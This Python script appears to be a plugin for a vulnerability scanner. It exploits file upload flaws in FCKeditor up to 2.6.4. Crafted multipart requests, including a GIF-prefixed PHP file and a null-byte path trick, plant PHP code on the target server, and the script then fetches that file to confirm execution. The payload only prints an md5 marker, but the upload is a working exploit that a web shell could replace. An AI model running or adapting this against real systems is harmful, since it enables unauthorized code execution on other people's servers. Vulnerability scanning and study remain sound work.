#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'ontheway'
import re

'''
fckeditor版本 <= 2.4.3
'''
def fck2_4_3(host):
    path = "editor/filemanager/upload/php/upload.php?Type=Media"
    data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
    data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ssdlh.php\"\r\n"
    data += "Content-Type: image/jpeg\r\n\r\n"
    data += "GIF89a<?php print(md5(521521));?>\r\n"
    data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
    head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
    url = host + path
    code, head, body, ecode, redirect_url = curl.curl('-H \'%s\' -d \'%s\' %s' % (head,data,url))
    if code == 200:
        shell = re.findall("eted\(\d+,\"(.+?.php)\"",body)
        if shell:
            phpurl = util.urljoin(host, '../'+shell[0])
            code, head, body, ecode, redirect_url = curl.curl(phpurl)
            if code==200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                security_hole('upload vulnerable:%s' % phpurl)
            else:
                security_info('maybe vulnerable:%s' % phpurl)

'''
fckeditor 版本 介于2.4.3与2.6.4之间（不包括2.4.3）
'''
def fck2_6_4(host):
    path = "editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=ssdlh.php%00.jpg"

    data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
    data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"a.jpg\"\r\n"
    data += "Content-Type: image/jpeg\r\n\r\n"
    data += "GIF89a<?php print(md5(521521));?>\r\n"
    data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
    head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
    url = host + path
    code, head, body, ecode, redirect_url = curl.curl('-H \'%s\' -d \'%s\' %s' % (head,data,url))
    if code == 200:
        shell = re.findall("eted\(\d+,\"(.+?\.php)",body)
        if shell:
            phpurl = util.urljoin(host, '../'+shell[0])
            code, head, body, ecode, redirect_url = curl.curl(phpurl)
            if code==200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                security_hole('upload vulnerable:%s' % phpurl)
            else:
                security_info('maybe vulnerable:%s' % phpurl)
            
            


def assign(service, arg):
    if service == "fckeditor":
        return True, arg


def audit(arg):
    fck2_4_3(arg)
    fck2_6_4(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('fckeditor', 'http://127.0.0.1/fckeditor2.6/')[1])
